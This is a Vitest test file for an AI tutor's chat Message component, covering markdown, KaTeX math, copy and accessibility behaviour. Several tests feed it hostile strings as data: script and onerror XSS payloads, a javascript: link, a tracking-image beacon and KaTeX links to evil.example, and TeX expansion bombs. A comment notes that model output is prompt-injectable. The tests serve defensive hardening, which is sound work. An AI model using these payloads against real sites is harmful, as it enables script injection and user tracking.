// @vitest-environment jsdom
import { describe, it, expect, afterEach, vi } from "vitest";
import { render, cleanup, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { Message, MessageMarkdown } from "./Message";

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
  delete (navigator as { clipboard?: unknown }).clipboard;
});

/** Install a fake async clipboard. jsdom implements none of it, which is the
 *  whole reason Message.tsx guards `navigator.clipboard` rather than calling
 *  into it -- the un-stubbed case is exercised by its own test below. */
function stubClipboard(writeText = vi.fn(async () => undefined)) {
  Object.defineProperty(navigator, "clipboard", {
    value: { writeText },
    configurable: true,
    writable: true,
  });
  return writeText;
}

// #300: aria-busy on the in-progress AI message suppresses per-chunk churn
// inside ConversationView's role="log" aria-live="polite" region (see that
// component's own #300 tests) -- a streamed reply announces once, whole,
// on completion instead of being re-announced on every appended token.
describe("Message aria-busy (#300)", () => {
  it("sets aria-busy=true on the ai message while isStreaming", () => {
    const { container } = render(
      <Message role="ai" isStreaming={true}>
        Partial answer…
      </Message>,
    );
    expect(container.querySelector(".message--ai")!.getAttribute("aria-busy")).toBe("true");
  });

  it("sets aria-busy=false once isStreaming is false", () => {
    const { container } = render(
      <Message role="ai" isStreaming={false}>
        Complete answer.
      </Message>,
    );
    expect(container.querySelector(".message--ai")!.getAttribute("aria-busy")).toBe("false");
  });

  it("defaults aria-busy=false when isStreaming is omitted", () => {
    const { container } = render(<Message role="ai">Complete answer.</Message>);
    expect(container.querySelector(".message--ai")!.getAttribute("aria-busy")).toBe("false");
  });
});

// #327: the message surface did no markdown parsing at all -- a reply with a
// blank line rendered as one run-on paragraph and "# Sample Spaces" rendered
// as a literal hash.
describe("Message markdown rendering (#327)", () => {
  it("splits blank-line-separated text into separate paragraphs", () => {
    const { container } = render(
      <Message role="ai">{"First thought.\n\nSecond thought."}</Message>,
    );
    const paragraphs = container.querySelectorAll(".message__ai-body p");
    expect(paragraphs).toHaveLength(2);
    expect(paragraphs[0]!.textContent).toBe("First thought.");
    expect(paragraphs[1]!.textContent).toBe("Second thought.");
  });

  it("renders an ATX heading as a heading element, not a literal '#'", () => {
    render(<Message role="ai">{"# Sample Spaces\n\nA sample space is…"}</Message>);
    const heading = screen.getByRole("heading", { name: "Sample Spaces" });
    expect(heading.textContent).not.toContain("#");
    // Shifted down one level: ConversationView owns the page's own h1.
    expect(heading.tagName).toBe("H2");
  });

  it("renders bold, italic and inline code", () => {
    const { container } = render(
      <Message role="ai">{"**bold** and *italic* and `code()`"}</Message>,
    );
    expect(container.querySelector("strong")!.textContent).toBe("bold");
    expect(container.querySelector("em")!.textContent).toBe("italic");
    expect(container.querySelector("code.md-code")!.textContent).toBe("code()");
  });

  it("renders unordered and ordered lists", () => {
    const { container } = render(
      <Message role="ai">{"- one\n- two\n\n1. first\n2. second"}</Message>,
    );
    expect(container.querySelectorAll("ul > li")).toHaveLength(2);
    expect(container.querySelectorAll("ol > li")).toHaveLength(2);
  });

  it("routes a fenced block into CodeBlock exactly once, with its language label", () => {
    const { container } = render(
      <Message role="ai">{"Try:\n\n```r\nmean(x)\n```"}</Message>,
    );
    const blocks = container.querySelectorAll(".code-block");
    expect(blocks).toHaveLength(1);
    expect(container.querySelector(".code-block__lang")!.textContent).toBe("R");
    expect(container.querySelector(".code-block__pre")!.textContent).toBe("mean(x)");
    // No stray second copy of the fence body outside the block, and no bare
    // <pre> fallback alongside it.
    expect(container.querySelectorAll("pre")).toHaveLength(1);
    expect(container.textContent).not.toContain("```");
  });
});

// #327: LaTeX leaked raw -- the running transcript literally showed
// "\(\{HH, HT, \dots\}\)". remark-math reads only the dollar dialect, so
// Message.tsx rewrites the LaTeX delimiters before parsing.
describe("Message math rendering (#327)", () => {
  it("typesets inline math written with \\( … \\)", () => {
    const { container } = render(
      <Message role="ai">{"The sample space is \\(\\{HH, HT, \\dots\\}\\)."}</Message>,
    );
    expect(container.querySelector(".katex")).not.toBeNull();
    expect(container.textContent).not.toContain("\\(");
    // The VISIBLE half of KaTeX's output carries typeset glyphs, not source.
    // (KaTeX also emits a MathML twin holding the original TeX in an
    // <annotation> for assistive tech -- which is exactly why the copy
    // action reads the markdown source rather than the DOM's textContent.)
    const visible = container.querySelector(".katex-html")!;
    expect(visible.textContent).toContain("…");
    expect(visible.textContent).not.toContain("dots");
    expect(
      container.querySelector('annotation[encoding="application/x-tex"]')!.textContent,
    ).toBe("\\{HH, HT, \\dots\\}");
  });

  /* #327 review finding 2: a LONE `$` is no longer math
     (`singleDollarTextMath: false`). This is the deliberate half of that
     trade -- a model writing `$p = 0.5$` now gets literal dollars back. The
     other half, the currency it stops corrupting, is pinned below. The
     product-side fix is a prompt instruction to emit `\( … \)`. */
  it("does NOT typeset a single-dollar span -- prose dollars win (finding 2)", () => {
    const { container } = render(<Message role="ai">{"Let $p = 0.5$ here."}</Message>);
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.querySelector(".message__ai-body p")!.textContent).toBe(
      "Let $p = 0.5$ here.",
    );
  });

  it("typesets display math written with \\[ … \\]", () => {
    const { container } = render(
      <Message role="ai">{"Therefore:\n\n\\[\nP(A) = \\frac{1}{2}\n\\]"}</Message>,
    );
    expect(container.querySelector(".katex-display")).not.toBeNull();
    expect(container.textContent).not.toContain("\\[");
  });

  it("typesets display math written with $$ … $$", () => {
    const { container } = render(<Message role="ai">{"$$\nE[X] = \\mu\n$$"}</Message>);
    expect(container.querySelector(".katex-display")).not.toBeNull();
  });

  it("leaves math delimiters inside a fenced block alone", () => {
    const { container } = render(
      <Message role="ai">{"```tex\n\\(x\\)\n```"}</Message>,
    );
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.querySelector(".code-block__pre")!.textContent).toBe("\\(x\\)");
  });

  it("leaves an UNPAIRED delimiter alone rather than emitting a stray $", () => {
    // Half-arrived math mid-stream. Rewriting the lone "\(" to "$" would send
    // a dollar sign hunting for a partner further down the reply and swallow
    // prose into a math span. Left alone, CommonMark's own backslash-escape
    // rule renders it as the literal punctuation -- ugly for the one frame it
    // survives, but never destructive.
    const { container } = render(<Message role="ai">{"The set \\(\\{HH"}</Message>);
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.querySelector(".message__ai-body p")!.textContent).toBe("The set ({HH");
  });
});

// #327: this renders model output, which an attacker can influence through a
// homework body. No dangerouslySetInnerHTML, no rehype-raw, default
// urlTransform -- these tests pin all three.
describe("Message renders LLM output inertly (#327)", () => {
  it("does not build DOM from raw HTML in the reply", () => {
    const { container } = render(
      <Message role="ai">{'<img src=x onerror="alert(1)"> <script>alert(2)</script>'}</Message>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("iframe")).toBeNull();
  });

  it("strips a javascript: link target", () => {
    const { container } = render(
      <Message role="ai">{"[click me](javascript:alert(1))"}</Message>,
    );
    const link = container.querySelector("a");
    // Either the href is neutralised or no anchor survives at all; what must
    // never happen is a live javascript: URL in the document.
    expect(link?.getAttribute("href") ?? "").not.toContain("javascript:");
  });

  it("hardens the links it does render", () => {
    const { container } = render(
      <Message role="ai">{"[UW](https://washington.edu)"}</Message>,
    );
    const link = container.querySelector("a")!;
    expect(link.getAttribute("href")).toBe("https://washington.edu");
    expect(link.getAttribute("rel")).toContain("noopener");
    expect(link.getAttribute("rel")).toContain("noreferrer");
  });
});

// #327: App.tsx wraps each streamed text part in a bare <p>, trapping the raw
// markdown inside a block element markdown itself has to own.
describe("Message unwraps App.tsx's bare paragraphs (#327)", () => {
  it("re-renders a bare <p>'s text as markdown", () => {
    render(
      <Message role="ai">
        <>
          <p>{"# Heading\n\nBody text."}</p>
        </>
      </Message>,
    );
    expect(screen.getByRole("heading", { name: "Heading" })).toBeTruthy();
  });

  it("leaves a CLASSED paragraph (the stopped-turn note) untouched", () => {
    const { container } = render(
      <Message role="ai">
        <>
          <p>{"Partial answer."}</p>
          <p className="message__stopped-note">{"You stopped this response."}</p>
        </>
      </Message>,
    );
    const note = container.querySelector(".message__stopped-note")!;
    expect(note.textContent).toBe("You stopped this response.");
  });

  it("passes non-paragraph children (generative UI) straight through", () => {
    const { container } = render(
      <Message role="ai">
        <>
          <div className="definition-card">a card</div>
        </>
      </Message>,
    );
    expect(container.querySelector(".definition-card")!.textContent).toBe("a card");
  });
});

// #327: there were no per-turn affordances at all.
describe("Message copy action (#327)", () => {
  it("offers a keyboard-reachable copy control with a stable accessible name", () => {
    render(<Message role="ai">{"An answer."}</Message>);
    const button = screen.getByRole("button", { name: "Copy the tutor's message" });
    // Present in the DOM (and so in the tab order) rather than mounted on
    // hover -- CSS does the revealing.
    expect(button.tagName).toBe("BUTTON");
    expect(button.getAttribute("type")).toBe("button");
  });

  /* Regression: App.tsx renders each text part as <MessageMarkdown>{raw}</...>
     rather than a bare <p>, which is the correct wiring -- markdown has to own
     its own block structure. But collectTurnSource only knew about strings,
     bare <p>s and Fragments, so it returned "" for that shape and the copy row
     silently disappeared from every turn in the real app while every existing
     test (which passes a raw string) still passed. Caught by measuring the
     running page, not by the suite. */
  it("still finds the source when the turn is a MessageMarkdown element (App.tsx's shape)", async () => {
    const writeText = stubClipboard();
    render(
      <Message role="ai">
        <MessageMarkdown>{"## Sample spaces\n\nList the outcomes."}</MessageMarkdown>
      </Message>,
    );

    await userEvent.click(screen.getByRole("button", { name: "Copy the tutor's message" }));
    expect(writeText).toHaveBeenCalledWith("## Sample spaces\n\nList the outcomes.");
  });

  it("copies the markdown SOURCE and swaps its label to Copied", async () => {
    const writeText = stubClipboard();
    render(<Message role="ai">{"# Heading\n\nBody with $x$."}</Message>);

    await userEvent.click(screen.getByRole("button", { name: "Copy the tutor's message" }));

    expect(writeText).toHaveBeenCalledWith("# Heading\n\nBody with $x$.");
    /* Icon-only control: the state is carried by the glyph swap (asserted via
       the state class, since the SVG itself is aria-hidden) and announced by
       the live region. There is no visible label to assert. */
    await waitFor(() => {
      expect(
        screen.getByRole("button", { name: "Copy the tutor's message" }).className,
      ).toContain("message__copy--copied");
    });
    expect(document.querySelector(".message__actions .sr-only")!.textContent).toBe(
      "Message copied to clipboard.",
    );
  });

  it("joins multiple bare paragraphs back into one markdown source", async () => {
    const writeText = stubClipboard();
    render(
      <Message role="ai">
        <>
          <p>{"First part."}</p>
          <p>{"Second part."}</p>
        </>
      </Message>,
    );

    await userEvent.click(screen.getByRole("button", { name: "Copy the tutor's message" }));
    expect(writeText).toHaveBeenCalledWith("First part.\n\nSecond part.");
  });

  it("degrades to a visible failure instead of throwing when the clipboard is absent", async () => {
    // jsdom implements no clipboard at all -- this is the un-stubbed case.
    expect((navigator as { clipboard?: unknown }).clipboard).toBeUndefined();
    render(<Message role="ai">{"An answer."}</Message>);

    await userEvent.click(screen.getByRole("button", { name: "Copy the tutor's message" }));

    await waitFor(() => {
      expect(
        screen.getByRole("button", { name: "Copy the tutor's message" }).className,
      ).toContain("message__copy--failed");
    });
    expect(document.querySelector(".message__actions .sr-only")!.textContent).toMatch(
      /couldn.t copy the message/i,
    );
  });

  it("survives a clipboard write that rejects", async () => {
    stubClipboard(vi.fn(async () => { throw new Error("Document is not focused"); }));
    render(<Message role="ai">{"An answer."}</Message>);

    await userEvent.click(screen.getByRole("button", { name: "Copy the tutor's message" }));

    await waitFor(() => {
      expect(
        screen.getByRole("button", { name: "Copy the tutor's message" }).className,
      ).toContain("message__copy--failed");
    });
    expect(document.querySelector(".message__actions .sr-only")!.textContent).toMatch(
      /couldn.t copy the message/i,
    );
  });

  it("reserves the actions row but hides the button mid-stream", () => {
    const { container } = render(
      <Message role="ai" isStreaming={true}>
        {"Partial ans"}
      </Message>,
    );
    // The row exists (so revealing the button later cannot shift layout)...
    expect(container.querySelector(".message__actions")).not.toBeNull();
    // ...but a half-written answer is not offered for copying.
    expect(container.querySelector(".message__copy")!.hasAttribute("hidden")).toBe(true);
  });

  it("renders no actions row for a turn with no copyable text", () => {
    const { container } = render(
      <Message role="ai" isStreaming={true}>
        {null}
      </Message>,
    );
    expect(container.querySelector(".message__actions")).toBeNull();
  });

  it("offers no copy action on student or system turns", () => {
    const { container: student } = render(<Message role="student">Hi</Message>);
    expect(student.querySelector(".message__copy")).toBeNull();
    cleanup();
    const { container: system } = render(<Message role="system">submitted</Message>);
    expect(system.querySelector(".message__copy")).toBeNull();
  });
});

// #327: the student's own typing is deliberately NOT markdown-rendered --
// an emphasis parser silently eats the asterisks out of "5 * 3 * 2".
describe("Message student turns are literal (#327)", () => {
  it("leaves the student's asterisks alone", () => {
    const { container } = render(<Message role="student">{"5 * 3 * 2 = 30"}</Message>);
    expect(container.querySelector(".message__student-bubble")!.textContent).toBe("5 * 3 * 2 = 30");
    expect(container.querySelector("em")).toBeNull();
  });

  it("keeps the student's newlines in the DOM (pre-wrap does the rest)", () => {
    const { container } = render(<Message role="student">{"line one\nline two"}</Message>);
    expect(container.querySelector(".message__student-bubble")!.textContent).toBe(
      "line one\nline two",
    );
  });
});

/* ==========================================================================
   #327 REVIEW REGRESSIONS

   Every case below was a CONFIRMED defect of the first implementation, which
   rewrote math delimiters in the markdown SOURCE STRING before parsing
   (`\( … \)` -> `$ … $`, `\[ … \]` -> `\n\n$$ … $$\n\n`). All of them are
   consequences of that one decision, and all of them are fixed by the
   remarkLatexMath PLUGIN, which builds inlineMath/math nodes in the tree
   instead -- it emits no `$` and injects no blank lines.
   ========================================================================== */

describe("Message math does not collide with prose dollars (#327 findings 1-2)", () => {
  it("keeps a currency amount intact next to inline math (finding 1)", () => {
    // The emitted `$` used to pair with the `$` in "$5", swallowing the
    // sentence: "A ticket costs 5.Thechanceis…". Currency plus probability in
    // one sentence is house style for a statistics tutor.
    const { container } = render(
      <Message role="ai">{"A ticket costs $5. The chance is \\(p\\) each draw."}</Message>,
    );
    const para = container.querySelector(".message__ai-body p")!;
    expect(para.textContent).toContain("A ticket costs $5.");
    expect(para.textContent).toContain("each draw.");
    // …and the probability still typesets.
    expect(container.querySelector(".katex")).not.toBeNull();
    expect(
      container.querySelector('annotation[encoding="application/x-tex"]')!.textContent,
    ).toBe("p");
  });

  it("never typesets two currency amounts as one equation (finding 2)", () => {
    // "$10 with probability 0.5 and $" used to become math.
    const { container } = render(
      <Message role="ai">
        {"If the payout is $10 with probability 0.5 and $0 otherwise"}
      </Message>,
    );
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.querySelector(".message__ai-body p")!.textContent).toBe(
      "If the payout is $10 with probability 0.5 and $0 otherwise",
    );
  });

  it("still treats $$ … $$ as display math (the half of the dollar dialect kept)", () => {
    const { container } = render(<Message role="ai">{"$$\nE[X] = \\mu\n$$"}</Message>);
    expect(container.querySelector(".katex-display")).not.toBeNull();
  });
});

describe("Message display math stays inside its container (#327 finding 3)", () => {
  it("does not split an ordered list or restart its numbering", () => {
    // The injected blank line used to end the list: two <ol>s, the second
    // carrying start="2" -- and any renderer without that attribute would
    // have renumbered the steps 1, 1.
    const { container } = render(
      <Message role="ai">
        {"1. First step:\n\n   \\[\n   a = 1\n   \\]\n\n2. Second step."}
      </Message>,
    );
    expect(container.querySelectorAll("ol")).toHaveLength(1);
    expect(container.querySelectorAll("ol > li")).toHaveLength(2);
    const items = container.querySelectorAll("ol > li");
    expect(items[0]!.querySelector(".katex-display")).not.toBeNull();
    expect(items[1]!.textContent).toContain("Second step.");
  });

  it("does not split a blockquote or swallow its '>' markers into the TeX", () => {
    const { container } = render(
      <Message role="ai">{"> Given:\n>\n> \\[\n> a = 1\n> \\]"}</Message>,
    );
    const quotes = container.querySelectorAll("blockquote");
    expect(quotes).toHaveLength(1);
    expect(quotes[0]!.querySelector(".katex-display")).not.toBeNull();
    expect(quotes[0]!.textContent).not.toContain(">");
    expect(
      container.querySelector('annotation[encoding="application/x-tex"]')!.textContent,
    ).toBe("a = 1");
  });

  it("does not empty a GFM table cell or leak the next row as literal text", () => {
    // Before: the cell rendered empty, the math escaped the table entirely,
    // and "| 2 |" appeared as a literal paragraph underneath it.
    const { container } = render(
      <Message role="ai">{"| Case | Value |\n| --- | --- |\n| $$x$$ | 2 |"}</Message>,
    );
    const cells = container.querySelectorAll("tbody tr td");
    expect(cells).toHaveLength(2);
    expect(cells[0]!.querySelector(".katex")).not.toBeNull();
    expect(cells[1]!.textContent).toBe("2");
    expect(container.textContent).not.toContain("| 2 |");
  });

  it("typesets \\( … \\) inside a table cell without touching the table", () => {
    const { container } = render(
      <Message role="ai">{"| Case | Value |\n| --- | --- |\n| \\(x\\) | 2 |"}</Message>,
    );
    const cells = container.querySelectorAll("tbody tr td");
    expect(cells).toHaveLength(2);
    expect(cells[0]!.querySelector(".katex")).not.toBeNull();
    expect(cells[1]!.textContent).toBe("2");
  });
});

describe("Message respects CommonMark's escaped bracket (#327 finding 4)", () => {
  /* The disambiguation rule, which is also documented on remarkLatexMath:
     `\[ … \]` is display math ONLY when the delimiters own their lines. `\[`
     is genuinely ambiguous -- CommonMark says "literal [", every LLM says
     "display math" -- so the tie goes to the reading that cannot destroy
     prose, and the on-its-own-lines shape is how models actually emit it. */
  it("leaves \\[bracketed\\] in mid-sentence as literal brackets", () => {
    const { container } = render(
      <Message role="ai">{"Use the notation \\[bracketed\\] in prose."}</Message>,
    );
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.querySelector(".message__ai-body p")!.textContent).toBe(
      "Use the notation [bracketed] in prose.",
    );
  });

  it("leaves an escaped interval alone", () => {
    const { container } = render(
      <Message role="ai">{"Consider the interval \\[0, 1\\] here."}</Message>,
    );
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.querySelector(".message__ai-body p")!.textContent).toBe(
      "Consider the interval [0, 1] here.",
    );
  });

  it("still typesets \\[ … \\] when the delimiters own their lines", () => {
    const { container } = render(
      <Message role="ai">{"Therefore:\n\n\\[\nP(A) = \\frac{1}{2}\n\\]"}</Message>,
    );
    expect(container.querySelector(".katex-display")).not.toBeNull();
  });
});

describe("Message does not fetch remote images (#327 finding 5)", () => {
  it("renders the alt text instead of an <img src> that would beacon on render", () => {
    // Prompt-injectable through a homework body, and there is no CSP in this
    // repo to catch it: an <img src> fires a request from the student's
    // browser the moment the turn renders, leaking IP, user-agent and timing
    // to an attacker-chosen host with zero clicks.
    const { container } = render(
      <Message role="ai">{"![beacon](https://evil.example/track.png?u=alice)"}</Message>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
    // Not silently dropped -- the alt text is the trace.
    expect(container.querySelector(".md-image-alt")!.textContent).toBe("beacon");
  });

  it("leaves a visible marker when the image has no alt text", () => {
    const { container } = render(
      <Message role="ai">{"![](https://evil.example/track.png)"}</Message>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector(".md-image-alt")!.textContent).toBe("[image]");
  });
});

describe("Message math delimiter edge cases (#327 findings 6-7)", () => {
  it("does not treat an ESCAPED backslash as a delimiter (finding 6)", () => {
    // `\\(` is an escaped backslash followed by a paren, not a math opener.
    // The old pass rewrote it and produced "Literal $not math$ here.".
    const { container } = render(
      <Message role="ai">{"Literal \\\\(not math\\\\) here."}</Message>,
    );
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.querySelector(".message__ai-body p")!.textContent).toBe(
      "Literal \\(not math\\) here.",
    );
  });

  it("typesets \\( … \\) with spaces inside the delimiters (finding 7)", () => {
    // The old code carried a comment claiming remark-math "requires the
    // opening $ to be followed by a non-space", which is false -- "$ x $"
    // typesets fine. Nothing here depends on that claim; the TeX is trimmed
    // because leading whitespace in TeX is meaningless, not to appease a rule
    // that does not exist.
    const { container } = render(<Message role="ai">{"The value \\( x \\) here."}</Message>);
    expect(container.querySelector(".katex")).not.toBeNull();
    expect(
      container.querySelector('annotation[encoding="application/x-tex"]')!.textContent,
    ).toBe("x");
  });

  it("typesets display math with spaces inside the delimiters", () => {
    const { container } = render(<Message role="ai">{"\\[  a = 1  \\]"}</Message>);
    expect(container.querySelector(".katex-display")).not.toBeNull();
  });
});

describe("Message survives hostile and half-arrived TeX (#327 findings 10, KaTeX limits)", () => {
  it("does not flash a red parse error for a formula still being typed (finding 10)", () => {
    // remark-math's flow math closes at END OF INPUT, so every token of a
    // streamed "$$ … $$" produced a math node holding a half-typed
    // expression and KaTeX rendered a red "parse error" -- once per token.
    // An unterminated formula is INCOMPLETE, not wrong, so it is handed back
    // as plain text and typesets the instant the closing fence lands.
    const { container } = render(<Message role="ai">{"Then:\n\n$$\nE = mc^"}</Message>);
    expect(container.querySelector(".katex-error")).toBeNull();
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.textContent).toContain("E = mc^");
  });

  it("typesets the same formula once its closing fence arrives", () => {
    const { container } = render(<Message role="ai">{"Then:\n\n$$\nE = mc^2\n$$"}</Message>);
    expect(container.querySelector(".katex-display")).not.toBeNull();
  });

  it("renders a CLOSED but malformed \\frac as an error node instead of throwing", () => {
    // rehype-katex forces throwOnError:false; without it one bad macro in a
    // streamed reply would throw inside render and take the transcript down.
    expect(() =>
      render(<Message role="ai">{"$$\n\\frac\n$$"}</Message>),
    ).not.toThrow();
    expect(document.querySelector(".message__ai-body")!.textContent).toContain("frac");
  });

  it("disables \\href via KaTeX trust:false", () => {
    // Display math is used here rather than \\( … \\) on purpose: a bare URL
    // in inline prose is claimed by remark-gfm's autolink-literal rule before
    // remarkLatexMath sees it (see its LIMITATION note), which would make
    // this test measure the autolink rather than KaTeX's trust setting.
    const { container } = render(
      <Message role="ai">{"$$\n\\href{https://evil.example/x}{click}\n$$"}</Message>,
    );
    expect(container.querySelector('a[href*="evil.example"]')).toBeNull();
    expect(container.querySelector("a")).toBeNull();
  });

  it("disables \\includegraphics via KaTeX trust:false", () => {
    const { container } = render(
      <Message role="ai">
        {"$$\n\\includegraphics[width=1em]{https://evil.example/t.png}\n$$"}
      </Message>,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain('src="https://evil.example');
  });

  it("bounds a macro-expansion bomb with maxExpand", () => {
    // Each level doubles; ten levels is 1024 expansions against maxExpand 500.
    const bomb =
      "$$\n\\def\\a{\\b\\b}\\def\\b{\\c\\c}\\def\\c{\\d\\d}\\def\\d{\\e\\e}" +
      "\\def\\e{\\f\\f}\\def\\f{\\g\\g}\\def\\g{\\h\\h}\\def\\h{\\i\\i}" +
      "\\def\\i{\\j\\j}\\def\\j{x}\\a\n$$";
    const started = Date.now();
    const { container } = render(<Message role="ai">{bomb}</Message>);
    expect(Date.now() - started).toBeLessThan(5000);
    // Bounded rather than expanded: KaTeX reports rather than emitting 1024 x's.
    expect(container.querySelector(".katex-error")).not.toBeNull();
  });

  it("bounds a \\rule bomb with maxSize", () => {
    const { container } = render(<Message role="ai">{"$$\n\\rule{9999em}{9999em}\n$$"}</Message>);
    /* maxSize:40 clamps the value that reaches CSS. 9999em survives only in
       KaTeX's <annotation>, which echoes the TeX source and paints nothing --
       the check is deliberately against the rendered half, because that is
       the half that could have papered over the page. */
    const painted = container.querySelector(".katex-html")!;
    expect(painted.innerHTML).not.toContain("9999em");
    expect(painted.innerHTML).toContain("40em");
  });
});

describe("Message code regions stay verbatim (#327)", () => {
  it("protects \\( and $ inside an inline code span", () => {
    const { container } = render(
      <Message role="ai">{"Write `\\(x\\)` or `$x$` to mean math."}</Message>,
    );
    expect(container.querySelector(".katex")).toBeNull();
    const spans = container.querySelectorAll("code.md-code");
    expect(spans[0]!.textContent).toBe("\\(x\\)");
    expect(spans[1]!.textContent).toBe("$x$");
  });

  it("leaves an UNCLOSED fence running to end of input (the mid-stream shape)", () => {
    const { container } = render(<Message role="ai">{"Try:\n\n```r\nmean(\\(x\\))"}</Message>);
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.querySelector(".code-block__pre")!.textContent).toBe("mean(\\(x\\))");
  });

  it("handles a ~~~ fence", () => {
    const { container } = render(<Message role="ai">{"~~~python\nf(\\(x\\))\n~~~"}</Message>);
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.querySelector(".code-block__pre")!.textContent).toBe("f(\\(x\\))");
  });

  it("handles a 4+-backtick fence containing a 3-backtick run", () => {
    const { container } = render(
      <Message role="ai">{"````md\n```\n\\(x\\)\n```\n````"}</Message>,
    );
    expect(container.querySelector(".katex")).toBeNull();
    expect(container.querySelector(".code-block__pre")!.textContent).toBe("```\n\\(x\\)\n```");
  });
});

/* remark-gfm was in the plugin list from the start with no test at all. */
describe("Message renders GFM (#327)", () => {
  it("renders a pipe table", () => {
    const { container } = render(
      <Message role="ai">
        {"| Outcome | P |\n| --- | --- |\n| HH | 0.25 |\n| HT | 0.25 |"}
      </Message>,
    );
    expect(container.querySelectorAll("table")).toHaveLength(1);
    expect(container.querySelectorAll("thead th")).toHaveLength(2);
    expect(container.querySelectorAll("tbody tr")).toHaveLength(2);
    expect(container.querySelectorAll("tbody tr")[1]!.textContent).toBe("HT0.25");
  });

  it("renders strikethrough", () => {
    const { container } = render(<Message role="ai">{"~~wrong~~ right"}</Message>);
    expect(container.querySelector("del")!.textContent).toBe("wrong");
  });

  it("renders a task list", () => {
    const { container } = render(
      <Message role="ai">{"- [x] state the sample space\n- [ ] compute P(A)"}</Message>,
    );
    const boxes = container.querySelectorAll('input[type="checkbox"]');
    expect(boxes).toHaveLength(2);
    expect((boxes[0] as HTMLInputElement).checked).toBe(true);
    expect((boxes[1] as HTMLInputElement).checked).toBe(false);
    // GFM checkboxes are read-only by design -- this is a transcript.
    expect((boxes[0] as HTMLInputElement).disabled).toBe(true);
  });
});

describe("Message copy button is icon-only with a stable name (#327 finding 8)", () => {
  it("keeps one accessible name and one node while the glyph changes", async () => {
    /* A voice-control user's "click Copy the tutor's message" must keep
       working across the state change. The earlier text-label version was a
       considered trade AGAINST WCAG 2.5.3 (for 1.8s the visible label read
       "Copied", which the accessible name did not contain). Icon-only, there
       is no visible label at all, so 2.5.3 -- which binds only when one
       exists -- does not apply. This pins that: no rendered text, a stable
       name, the same DOM node throughout, and the state carried by the glyph
       plus the live region. */
    stubClipboard();
    render(<Message role="ai">{"An answer."}</Message>);
    const button = screen.getByRole("button", { name: "Copy the tutor's message" });
    expect(button.textContent).toBe("");
    expect(button.querySelector("svg")).toBeTruthy();
    expect(button.querySelector("svg")!.getAttribute("aria-hidden")).toBe("true");

    await userEvent.click(button);

    await waitFor(() => expect(button.className).toContain("message__copy--copied"));
    expect(button.textContent).toBe("");
    expect(button.getAttribute("aria-label")).toBe("Copy the tutor's message");
    expect(screen.getByRole("button", { name: "Copy the tutor's message" })).toBe(button);
    expect(document.querySelector(".message__actions .sr-only")!.textContent).toBe(
      "Message copied to clipboard.",
    );
  });
});
